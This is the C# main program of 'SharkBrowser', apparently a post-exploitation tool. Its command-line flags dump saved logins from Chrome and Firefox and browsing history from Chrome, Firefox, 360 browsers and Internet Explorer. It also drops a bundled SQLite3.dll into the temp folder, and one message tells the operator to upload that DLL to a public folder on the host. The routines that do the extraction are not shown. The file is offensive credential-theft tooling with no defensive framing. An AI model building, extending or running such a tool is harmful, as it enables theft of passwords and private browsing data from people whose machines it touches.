using System;
using Shark.lib;
using GetBrowser;
using System.Text.RegularExpressions;
using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using System.IO;

namespace Shark
{
    class Program
    {
        static void Usage()
        {
            string banner = @"
    Usage:
        .\SharkBrowser.exe -p all  

    Arguments:
        -p        - all,Chrome,FireFox (<=57),
        -h        - all,chrome,firefox,360es,360chrome,IE num
        -f        - 360chrome
    eg: SharkBrowser.exe -p all
        SharkBrowser.exe -h all 100
    ";
            Console.WriteLine(banner);
        }

        static void Main(string[] args)
        {
            string masterKey = "";
            if (args.Length < 2)
            {
                Usage();
                return;
            }
            string arg0 = args[0];
            string arg1 = args[1];

            if (arg0 == "-p")
            {
                switch (arg1.ToLower())
                {
                    case "all":
                        Chrome.GetLogins();
                        FireFox.GetLogins(masterKey);

                        break;

                    case "chrome":
                        Chrome.GetLogins();
                        break;

                    case "firefox":
                        FireFox.GetLogins(masterKey);
                        break;

                    default:
                        break;
                }
            }
            if (arg0 == "-h")
            {
                if (!File.Exists(Path.Combine(Path.GetTempPath(), "SQLite3.dll")))
                {
                    ExtractResFile(@"Shark.Resources.SQLite3.dll", Path.Combine(Path.GetTempPath(), "SQLite3.dll"));
                }
                if (!File.Exists(Path.Combine(Path.GetTempPath(), "SQLite3.dll")) && !File.Exists(Path.Combine(@"C:\Users\Public\Downloads\", "SQLite3.dll")))
                {
                    Common.showMessage("[-]", @"Please upload SQLite3.dll to C:\Users\Public\Downloads\SQLite3.dll");
                    return;
                }
                int num = 10;
                if (args.Length == 3 && !int.TryParse(args[2], out num))
                {
                    num = Convert.ToInt32(args[2]);
                }
                switch (arg1.ToLower())
                {
                    case "all":
                        Chrome.GetHistroy(num);
                        FireFox.GetHistroy(num);
                        _360ES.GetHistroy(num);
                        _360Chrome.GetHistroy(num);
                        IE.GetHistroy(num);
                        break;

                    case "chrome":
                        Chrome.GetHistroy(num);
                        break;

                    case "firefox":
                        FireFox.GetHistroy(num);
                        break;
                    case "360es":
                        _360ES.GetHistroy(num);
                        break;
                    case "360chrome":
                        _360Chrome.GetHistroy(num);
                        break;

                    case "ie":
                        IE.GetHistroy(num);
                        break;

                    default:
                        break;
                }
            }
            if (arg0 == "-f")
            {
                int num = 10;
                if (args.Length == 3 && !int.TryParse(args[2], out num))
                {
                    num = Convert.ToInt32(args[2]);
                }
                switch (arg1.ToLower())
                {
                 

                    case "360chrome":

                        _360Chrome.GetFavicons(num);
                        break;
                    default:
                        break;
                }
            }
        }
        public static bool ExtractResFile(string resFileName, string outputFile)
        {
            BufferedStream inStream = null;
            FileStream outStream = null;
            try
            {
                Assembly asm = Assembly.GetExecutingAssembly();
                string[] resNames = asm.GetManifestResourceNames();
                inStream = new BufferedStream(asm.GetManifestResourceStream(resFileName));
                outStream = new FileStream(outputFile, FileMode.Create, FileAccess.Write);
                byte[] buffer = new byte[1024];
                int length;
                while ((length = inStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    outStream.Write(buffer, 0, length);
                }
                outStream.Flush();
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                if (outStream != null) outStream.Close();
                if (inStream != null) inStream.Close();
            }
        }
    }
}
